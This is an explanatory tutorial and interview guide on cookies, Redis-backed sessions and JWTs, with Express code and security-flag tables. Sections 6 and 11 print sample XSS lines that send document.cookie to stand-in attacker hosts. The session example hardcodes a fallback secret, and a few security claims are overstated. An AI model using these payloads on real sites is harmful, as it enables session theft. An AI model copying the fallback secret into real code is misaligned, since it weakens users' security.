# Cookies, Sessions, and Authentication Tokens

## 1. What is it?
Because the HTTP protocol is fundamentally **stateless**, servers do not inherently recognize that two sequential requests originate from the same human user. To build interactive applications (shopping carts, authenticated dashboards, banking portals), web architectures simulate state across requests using three primary client-server mechanisms:
1. **Cookies**: Small key-value strings (~4KB limit) stored by the client browser that are **automatically attached** to every outbound HTTP request header matching the cookie's domain and path.
2. **Stateful Sessions**: An architecture where the server stores full user state in a database or in-memory cache (like Redis) and assigns the client an opaque, random **Session ID** passed via a cookie.
3. **Stateless Tokens (JWTs)**: Self-contained, digitally signed cryptographic payloads that carry user identity and permissions directly inside the token, allowing servers to verify identity without a database lookup.

---

## 2. Why does it exist?
Without state persistence:
- Clicking "Next Page" in an online store would empty your shopping cart.
- Every API call or form submission would require sending the user's raw username and password over the wire.
- Servers would have to re-hash passwords against the database on every single page view, collapsing server performance.

---

## 3. Mental Model
💡 **Think of it like this:**
- **Stateful Session (Hotel Keycard)**:
  - When you check in at a hotel, the receptionist looks at your ID, creates a record on their central computer (**Redis Session Store**), and hands you a plastic keycard containing only a random number: `#8842` (**Session ID**).
  - Every time you enter the gym or pool, the guard swipes your card against the hotel computer. If the central computer is down, your card is useless. If the hotel revokes your card at the front desk, you are locked out immediately.
- **Stateless Token / JWT (Government Passport / Visa)**:
  - When you visit a foreign country, you carry a passport signed with an official cryptographic seal (**Digital Signature**).
  - The border officer looks at your passport, verifies the seal with the embassy's public key, and lets you through. The officer does not need to call your home country's central government database to verify who you are!
  - *The Catch*: If your passport is stolen, the thief can travel freely until the passport reaches its printed expiration date, unless every airport maintains a live "stolen passport blacklist."

### Architecture Comparison
```
STATEFUL SESSION FLOW (Centralized Redis Database)
[ Client Browser ]                                     [ Express Server ]            [ Redis Session DB ]
        │                                                      │                              │
        │ ── 1. POST /login (user + password) ───────────────► │                              │
        │                                                      │ ── 2. Create session ──────► │
        │                                                      │ ◄── 3. Return session_id ─── │
        │ ◄── 4. Set-Cookie: sid=8842; HttpOnly; Secure ────── │                              │
        │                                                      │                              │
        │ ── 5. GET /dashboard (Cookie: sid=8842) ───────────► │                              │
        │                                                      │ ── 6. Lookup sid=8842 ─────► │
        │                                                      │ ◄── 7. User data found ───── │
        │ ◄── 8. Render dashboard ──────────────────────────── │                              │

─────────────────────────────────────────────────────────────────────────────────────────────────

STATELESS JWT FLOW (Zero Database Lookup)
[ Client Browser ]                                     [ Express Server ]            [ Database ]
        │                                                      │                              │
        │ ── 1. POST /login (user + password) ───────────────► │                              │
        │                                                      │ ── 2. Verify credentials ──► │
        │                                                      │ ◄── 3. User verified ────────┘
        │                                                      │ (Signs JWT with Server Secret)
        │ ◄── 4. Set-Cookie: token=eyJhbG...; HttpOnly ─────── │
        │                                                      │
        │ ── 5. GET /dashboard (Cookie: token=eyJhbG...) ────► │
        │                                                      │ (Verifies HMAC SHA256 Signature locally in RAM!)
        │ ◄── 6. Render dashboard (ZERO DB CALL!) ──────────── │ (Ultra-fast, infinite horizontal scale)
```

---

## 4. Basic Example: Inspecting and Setting Cookies in Node.js
Using raw Node.js HTTP to demonstrate the `Set-Cookie` response header and incoming `Cookie` request header:

```typescript
// cookie-demo.ts
import http from 'node:http';

const server = http.createServer((req, res) => {
  // Read incoming cookies sent by the browser
  const rawCookies = req.headers.cookie;
  console.log('[Server] Incoming Cookie Header:', rawCookies);

  // Set an ultra-secure session cookie
  res.writeHead(200, {
    'Content-Type': 'application/json',
    'Set-Cookie': [
      'session_id=s_9843a8df8; ' +
      'Max-Age=86400; ' +          // 24 hours in seconds
      'Path=/; ' +                  // Accessible on all paths
      'HttpOnly; ' +                // JavaScript cannot access via document.cookie (Anti-XSS!)
      'Secure; ' +                  // Only sent over HTTPS
      'SameSite=Lax'                // Protects against Cross-Site Request Forgery (Anti-CSRF!)
    ]
  });

  res.end(JSON.stringify({ message: 'Cookie has been issued securely' }));
});

server.listen(3000, () => console.log('Listening on http://localhost:3000'));
```

---

## 5. Real Example: Secure Session Architecture with Express and Redis
In modern enterprise applications, session records are offloaded to an in-memory Redis cluster with automatic TTL expiry:

```typescript
// session-server.ts
import express from 'express';
import session from 'express-session';
import { createClient } from 'redis';
import RedisStore from 'connect-redis';

const app = express();

// 1. Initialize Redis Client
const redisClient = createClient({ url: 'redis://localhost:6379' });
redisClient.connect().catch(console.error);

// 2. Configure Production Session Middleware
app.use(
  session({
    store: new RedisStore({ client: redisClient, prefix: 'sess:' }),
    name: '__Host-sid', // Prefix enforces Secure flag and root path
    secret: process.env.SESSION_SECRET || 'super-secure-secret-key-32-chars-min',
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,                                  // Anti-XSS
      secure: process.env.NODE_ENV === 'production',  // HTTPS only
      sameSite: 'lax',                                 // Anti-CSRF
      maxAge: 1000 * 60 * 60 * 24                      // 24 Hours
    }
  })
);

app.post('/api/login', (req, res) => {
  // Simulate user authentication
  (req.session as any).userId = 'usr_1092';
  (req.session as any).role = 'ADMIN';
  res.json({ message: 'Logged in successfully' });
});

app.get('/api/profile', (req, res) => {
  const userId = (req.session as any).userId;
  if (!userId) return res.status(401).json({ error: 'Unauthorized' });
  res.json({ userId, role: (req.session as any).role });
});

app.post('/api/logout', (req, res) => {
  req.session.destroy((err) => {
    res.clearCookie('__Host-sid');
    res.json({ message: 'Logged out cleanly from Redis and client' });
  });
});

app.listen(4000, () => console.log('Session Server on :4000'));
```

---

## 6. Under the Hood: Deep Anatomy of Cookie Security Flags

A cookie is not just a string; it is configured with strict browser-enforced security directives:

| Directive | Purpose | What Happens if Omitted? |
|---|---|---|
| **`HttpOnly`** | **Completely blocks JavaScript access** via `document.cookie`. | 🚨 **Catastrophic XSS Risk**: Any malicious JavaScript or compromised third-party npm package can run `fetch('attacker.com?c=' + document.cookie)` and steal the active user session! |
| **`Secure`** | Instructs the browser to **only transmit the cookie over encrypted HTTPS** connections. | 🚨 **Eavesdropping Risk**: On public Wi-Fi, the cookie would be transmitted in plaintext if a user clicks an `http://` link. |
| **`SameSite=Strict`** | Cookie is **never sent** in cross-site requests (e.g. clicking an external link from Twitter to your site). | Highest security, but users clicking external links appear logged out on first click. |
| **`SameSite=Lax`** | Standard default. Sent on top-level cross-site navigations (GET links), but **blocked on cross-site POST/PUT/DELETE**. | 🛡️ **Industry Gold Standard**: Shields against CSRF attacks while maintaining smooth user link navigation. |
| **`SameSite=None`** | Cookie is sent in all cross-site contexts (e.g. third-party iframes). | **Requires `Secure` flag**. Must be used for third-party widgets and embedded payment iframes. |
| **`Domain` & `Path`** | Restricts which hostnames and URL sub-paths can receive the cookie. | Defaults to the exact current host without subdomains. |
| **`Max-Age` / `Expires`**| Sets duration in seconds (`Max-Age`) or absolute date (`Expires`). | If omitted, the cookie is a **Session Cookie** and vanishes when the browser is closed. |

---

## 7. Important Rules of Web Storage
1. **The 4KB Cookie Ceiling**: Browsers strictly limit cookies to **4096 bytes per domain**. Storing large JSON objects in cookies causes HTTP 431 errors (`Request Header Fields Too Large`).
2. **Cookies are Sent on Every Single Request**: Any cookie set for domain `.example.com` is automatically sent with **every image, CSS, font, and API request**, consuming unnecessary upstream bandwidth. (This is why static assets should be hosted on a cookieless domain or CDN!).
3. **`localStorage` is Vulnerable to XSS by Design**: Any JavaScript running on the page can execute `localStorage.getItem()`. **Never store sensitive authentication or refresh tokens in `localStorage`!**

---

## 8. The #1 Placement Debate: Where Should You Store JWTs?

Interviewers frequently ask: *"Should you store JWT authentication tokens in `localStorage` or `HttpOnly` Cookies?"*

### The Comprehensive Senior Engineering Comparison:

```
┌──────────────────────────────────────┬──────────────────────────────────────┐
│       Option A: localStorage         │      Option B: HttpOnly Cookie       │
├──────────────────────────────────────┼──────────────────────────────────────┤
│ ❌ 100% Vulnerable to XSS:           │ 🛡️ 100% Immune to XSS:               │
│ Any malicious script, Chrome         │ JavaScript CANNOT read the cookie;   │
│ extension, or compromised npm        │ browser handles transmission         │
│ package can steal the token.         │ automatically.                       │
├──────────────────────────────────────┼──────────────────────────────────────┤
│ 🛡️ Immune to CSRF:                  │ ⚠️ Vulnerable to CSRF:               │
│ Browser never attaches token         │ Browser sends cookie automatically;  │
│ automatically; requires explicit     │ must be mitigated using              │
│ `Authorization: Bearer` header.      │ `SameSite=Lax` or Anti-CSRF tokens.  │
├──────────────────────────────────────┼──────────────────────────────────────┤
│ ❌ Not accessible during SSR:        │ 🛡️ Perfect for Next.js SSR:          │
│ Server components cannot read        │ Server can read cookie in            │
│ client localStorage before render.   │ `headers()` before rendering HTML.   │
└──────────────────────────────────────┴──────────────────────────────────────┘
```

> **The Definitive Senior Answer:**
> *"The industry gold standard is storing the token in an **`HttpOnly`, `Secure`, `SameSite=Lax` Cookie**. XSS is an existential vulnerability because a stolen token gives the attacker permanent access from anywhere in the world. CSRF, by contrast, is completely eliminated by modern `SameSite=Lax` cookie flags and Anti-CSRF synchronizer tokens. Furthermore, `HttpOnly` cookies are seamlessly accessible during Server-Side Rendering (SSR) in frameworks like Next.js."*

---

## 9. Best Practices in Modern Production
1. **The Dual-Token Architecture (Access + Refresh Tokens)**:
   - **Access Token**: Short-lived (15 minutes). Carries permissions. Kept in memory or fast cookie.
   - **Refresh Token**: Long-lived (7 days). Stored in an `HttpOnly` cookie. Used only at `/api/auth/refresh` to issue a new access token.
2. **Use Cookie Name Prefixes (`__Host-` and `__Secure-`)**:
   - Modern browsers enforce strict rules on cookies prefixed with `__Host-`: they **must have** `Secure`, cannot have a `Domain` attribute (host-only), and must have `Path=/`.
3. **Regenerate Session IDs on Login**: Always destroy the anonymous session ID and generate a brand-new ID upon successful authentication to defeat **Session Fixation** attacks.

---

## 10. Performance Considerations: Cookie Bloat
If an application sets 20 cookies tracking marketing and analytics, the total cookie header can reach 3KB.
- If a web page makes 100 static requests for images and fonts to the same domain, the user uploads $100 \times 3\text{KB} = 300\text{KB}$ of redundant cookie headers over mobile upload links!
- **Fix**: Serve all static media from a cookieless domain (e.g. `static.example-cdn.com`).

---

## 11. Security Considerations: Attacks & Mitigations
1. **Cross-Site Scripting (XSS)**:
   - Attacker injects `<script>fetch('hacker.com?c=' + document.cookie)</script>`.
   - *Mitigation*: `HttpOnly` flag + input sanitization with DOMPurify.
2. **Cross-Site Request Forgery (CSRF)**:
   - User visits `malicious.com`, which automatically triggers a hidden `POST` request to `bank.com/transfer`. The browser automatically attaches `bank.com` session cookies.
   - *Mitigation*: `SameSite=Lax` or `SameSite=Strict` cookie flags + Anti-CSRF Synchronizer Tokens.
3. **Session Hijacking & Session Fixation**:
   - Attacker tricks a user into logging in with an attacker-defined session ID.
   - *Mitigation*: Regenerate session ID on every authentication state change (`req.session.regenerate()`).

---

## 12. Complete Comparison Matrix
| Feature | Cookies | Stateful Sessions | Stateless JWTs |
|---|---|---|---|
| **Storage Location** | Browser disk / memory | Server Database / Redis | Stored in Client, verified by Server |
| **Server Storage Cost** | Zero | High ($O(N)$ with active users) | **Zero ($O(1)$ constant)** |
| **Instant Revocation** | Difficult without DB | **Trivial** (delete from Redis) | Difficult (requires token blacklist) |
| **Horizontal Scaling** | N/A | Requires shared Redis cluster | **Effortless** (stateless verification) |
| **Size Limit** | 4 KB | Session ID is ~32 bytes | 500 bytes to 2 KB (payload dependent) |
| **Best Used For** | Transporting auth IDs | Banking, enterprise apps | Microservices, mobile apps, SPA APIs |

---

## 13. Trade-offs: Sessions vs. JWTs
- **Choose Stateful Sessions (Redis)**: When instant revocation is critical. If an employee is fired, an administrator must be able to click "Revoke Access" and terminate all active sessions within 50 milliseconds.
- **Choose Stateless JWTs**: When building high-throughput microservices or mobile apps where scaling independent backend services without hitting a centralized Redis database bottleneck on every request is desired.

---

## 14. Real-World Usage: GitHub and Google Authentication
- **Google**: Uses short-lived access tokens with a centralized OAuth token refresh server. When you change your Google password, Google immediately increments a `token_version` timestamp in their database, invalidating all outstanding refresh tokens globally.
- **GitHub**: Protects session cookies using the `__Host-` prefix and strictly enforces `SameSite=Lax` along with hidden anti-CSRF form tokens on all mutation endpoints.

---

## 15. Placement Interview Questions

### Basic (Intern)
1. **What is the difference between `sessionStorage` and `localStorage`?**
   - *Spoken Answer*: "`localStorage` persists data with no expiration date; it survives tab closures, browser restarts, and computer reboots. `sessionStorage` is strictly scoped to the single browser tab that created it; the data is permanently wiped out the moment that specific tab is closed."

### Conceptual (Junior SDE)
2. **Explain what the `HttpOnly` and `SameSite` cookie flags do.**
   - *Spoken Answer*: "`HttpOnly` prevents client-side JavaScript from accessing the cookie via `document.cookie`, which completely protects authentication tokens from being stolen during an XSS attack. `SameSite` controls whether the cookie is sent with cross-site requests, protecting against CSRF attacks. `SameSite=Strict` blocks the cookie on all cross-site requests, while `SameSite=Lax` blocks it on cross-site mutations (like POST requests) but allows it on top-level GET navigation links."

### Implementation (SDE-1)
3. **If a JWT is completely stateless, how can a backend immediately revoke or invalidate a compromised token before it expires?**
   - *Spoken Answer*: "Because JWTs are self-contained, true instant revocation requires introducing state. The industry approach is the **Token Blacklist / Denylist in Redis**:
     1. When a user logs out or reports fraud, the server writes the token's unique identifier (`jti`) or the `userId` + revocation timestamp into Redis with a TTL equal to the token's remaining lifespan.
     2. Protected API middleware checks Redis for the `jti`.
     3. Alternatively, keep JWT lifespans ultra-short (e.g. 5 minutes) and rely on revoking the **Refresh Token** in the database, allowing access to expire naturally within 5 minutes."

### Debugging
4. **Users log in successfully on `app.example.com`, but when they navigate to `api.example.com`, they are treated as unauthenticated. Why?**
   - *Analysis*: By default, a cookie set by `app.example.com` has its domain scoped exclusively to `app.example.com` and is hidden from other subdomains.
   - *Fix*: Set the cookie's `Domain` attribute to the parent root domain with a leading dot:
     `Domain=.example.com;`
     This allows the cookie to be automatically shared across all subdomains (`app.example.com`, `api.example.com`, `admin.example.com`).

### Scenario-Based
5. **How does an attacker execute a Session Fixation attack, and how do you protect your app?**
   - *Spoken Answer*: "In a session fixation attack, the attacker visits the target website, obtains an anonymous session ID (e.g., `sid=123`), and tricks the victim into clicking a phishing link that loads the site with that predefined session ID. When the victim logs in, the server authenticates the user but keeps the same session ID `123`. The attacker now uses that ID to take over the account. The defense is to **always regenerate a brand-new session ID** whenever a user successfully logs in."

### Advanced (Tier-1 Product Company)
6. **Explain the Refresh Token Rotation pattern and how it detects token theft.**
   - *Spoken Answer*: "In Refresh Token Rotation, every time a client sends a refresh token to obtain a new access token, the server **invalidates that refresh token and issues a brand-new one**, returning the new pair.
     If an attacker intercepts a refresh token and uses it *after* the legitimate user has already exchanged it, the server detects that an already-invalidated token was presented. Recognizing this as token theft, the server immediately triggers an emergency revocation, invalidating the entire token family and forcing all sessions for that user to re-authenticate."

---

## 16. Placement Coding Challenge: JWT Header & Payload Parser from Scratch
Write a TypeScript function that decodes a raw JWT without external libraries and checks if the token has expired:

```typescript
// jwt-verifier.ts
export interface DecodedJWT<T = any> {
  header: Record<string, any>;
  payload: T & { exp?: number; iat?: number };
  isExpired: boolean;
}

export function parseAndCheckJWT<T = any>(token: string): DecodedJWT<T> {
  const parts = token.split('.');
  if (parts.length !== 3) {
    throw new Error('Invalid JWT format: Token must have 3 dot-separated parts');
  }

  // Base64URL decode helper
  const base64UrlDecode = (str: string): string => {
    let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
    while (base64.length % 4) {
      base64 += '=';
    }
    return Buffer.from(base64, 'base64').toString('utf-8');
  };

  const header = JSON.parse(base64UrlDecode(parts[0]));
  const payload = JSON.parse(base64UrlDecode(parts[1]));

  const nowSeconds = Math.floor(Date.now() / 1000);
  const isExpired = typeof payload.exp === 'number' ? nowSeconds >= payload.exp : false;

  return { header, payload, isExpired };
}
```

---

## 17. Common Interview Traps
- **Trap**: "Is the data stored inside a JWT encrypted?"
  - *Trap Explanation*: **No!** A standard JWT is **signed, not encrypted**. The header and payload are simply Base64URL-encoded JSON. Anyone who intercepts a JWT can decode and read its payload in 1 millisecond. Never store passwords, credit card numbers, or sensitive PII inside a standard JWT payload!
- **Trap**: "Can an attacker read an `HttpOnly` cookie using an XSS attack?"
  - *Trap Explanation*: **No.** The browser engine strictly isolates `HttpOnly` cookies from the JavaScript runtime (`document.cookie` returns an empty string or omits the cookie). However, an XSS attacker can still perform actions on the user's behalf by issuing `fetch()` requests from inside the infected page, which is why XSS must always be prevented.

---

## 18. Revision Summary
- **Cookies**: 4KB client storage automatically sent with matching HTTP requests.
- **Sessions**: Stateful; user data lives on server/Redis; client holds only an opaque ID.
- **JWTs**: Stateless; digitally signed JSON payload containing claims; zero server DB lookup needed.
- **Essential Cookie Flags**: `HttpOnly` (Anti-XSS), `Secure` (HTTPS only), `SameSite=Lax` (Anti-CSRF).
- Never store auth tokens in `localStorage`; use `HttpOnly` cookies.
- Use **Refresh Token Rotation** to detect and neutralize stolen credentials.

---

## 19. Quick Reference Cheat Sheet
```http
# The Gold-Standard Authentication Cookie Header:
Set-Cookie: __Host-auth_token=eyJhbGciOiJIUzI1Ni...; Path=/; Max-Age=900; HttpOnly; Secure; SameSite=Lax

# Cookie Security Hierarchy:
  HttpOnly      -> document.cookie CANNOT read (Anti-XSS)
  Secure        -> Transmitted ONLY over HTTPS
  SameSite=Lax  -> Blocks third-party POST requests (Anti-CSRF)
  SameSite=None -> Requires Secure; allows third-party iframes
  __Host- prefix-> Forces Secure, Path=/, and blocks subdomains
```
